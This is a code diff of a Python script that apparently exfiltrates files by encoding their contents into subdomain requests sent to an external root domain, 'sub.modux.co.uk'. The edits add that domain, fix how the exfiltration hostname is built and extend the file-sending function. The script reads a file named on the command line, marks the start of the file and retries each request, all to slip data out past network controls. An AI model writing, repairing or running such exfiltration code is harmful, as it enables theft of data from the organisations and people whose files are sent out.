@@ -3,10 +3,12 @@ import os,binascii,sys,time,re
 
 
 #http_proxy="http://40.115.115.11:3128"
+rootdomain='sub.modux.co.uk'
 http_proxy  = "http://localhost:8080"
 proxyDict = {"http"  : http_proxy,}
 
 filename = sys.argv[1]
+
 
 #create random ID for transaction to prevent caching
 ran= binascii.b2a_hex(os.urandom(2))
@@ -56,15 +58,15 @@ def sendrequest(string, count):
     count=str(count)
     string=string.replace('=', '-')
     try:
-        r = requests.get('http://'+str(ran)+'.'+count+'.'+string+rootdomain, headers=headers, proxies=proxyDict)
+        r = requests.get('http://'+str(ran)+'.'+count+'.'+string+'.'+rootdomain, headers=headers, proxies=proxyDict)
     except requests.exceptions.RequestException as e: 
         pass
     try:
-        r = requests.get('http://'+str(ran)+'.'+count+'.'+string+rootdomain, headers=headers, proxies=proxyDict)
+        r = requests.get('http://'+str(ran)+'.'+count+'.'+string+'.'+rootdomain, headers=headers, proxies=proxyDict)
     except requests.exceptions.RequestException as e: 
         pass
         
-def sendFile(instr):
+def sendFile(instr,filesize):
     fullarray=[]
     
     # send start request
@@ -75,7 +77,7 @@ def sendFile(instr):
     # add domain splitter 2e0o2e
     sendrequest('startoffile.'+filename+'.2e0o2e', count)
     
-        
+    
     time.sleep(2)
     sleepcount=0
     while True: 
